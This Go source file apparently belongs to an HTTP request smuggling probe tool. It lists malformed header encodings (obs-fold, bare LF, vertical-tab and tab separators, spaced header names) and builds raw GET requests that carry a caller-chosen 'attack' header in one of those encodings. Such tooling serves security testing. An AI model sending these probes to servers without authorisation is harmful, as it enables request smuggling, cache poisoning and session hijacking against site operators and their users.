package payloads

import (
	"fmt"

	"request_smuggling/core"
)

type HeaderMutation struct {
	Name   string
	Render func(key, value string) string
}

var HeaderMutations = []HeaderMutation{
	{"canonical", func(k, v string) string { return fmt.Sprintf("%s: %s\r\n", k, v) }},
	{"space-before-colon", func(k, v string) string { return fmt.Sprintf("%s : %s\r\n", k, v) }},
	{"tab-separator", func(k, v string) string { return fmt.Sprintf("%s:\t%s\r\n", k, v) }},
	{"obs-fold", func(k, v string) string { return fmt.Sprintf("%s:\r\n %s\r\n", k, v) }},
	{"bare-lf", func(k, v string) string { return fmt.Sprintf("%s: %s\n", k, v) }},
	{"leading-space-name", func(k, v string) string { return fmt.Sprintf(" %s: %s\r\n", k, v) }},
	{"space-in-name", func(k, v string) string { return fmt.Sprintf("%s abcd: %s\r\n", k, v) }},
	{"vtab-separator", func(k, v string) string { return fmt.Sprintf("%s:\x0b%s\r\n", k, v) }},
}

func BuildHeaderMatrixProbe(rec core.Record, mut HeaderMutation, attackKey, attackValue string) []byte {
	path, host, ua := extractVariablesFromRecord(rec)
	base := fmt.Sprintf(
		"GET %s HTTP/1.1\r\n"+
			"Host: %s\r\n"+
			"User-Agent: %s\r\n"+
			"Connection: keep-alive\r\n",
		path, host, ua,
	)
	return []byte(base + mut.Render(attackKey, attackValue) + "\r\n")
}
